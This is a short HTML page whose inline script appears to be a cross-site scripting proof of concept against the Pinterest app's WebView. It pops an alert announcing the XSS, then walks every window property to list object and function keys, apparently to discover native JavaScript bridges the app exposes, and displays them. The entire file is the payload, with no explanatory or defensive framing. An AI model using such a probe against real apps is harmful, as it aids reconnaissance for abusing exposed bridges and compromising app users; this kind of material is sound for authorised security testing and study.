<html>
  <body>
    <script>
      alert("XSS in Pinterest WebView");

      let foundKeys = "";

      for (let key in window) {
        try {
          if (typeof window[key] === "object" || typeof window[key] === "function") {
            foundKeys += key + "\n";
          }
        } catch (e) {
          // تجاهل الأخطاء
        }
      }

      alert("JS Bridges / Window Keys:\n\n" + foundKeys);
    </script>
  </body>
</html>
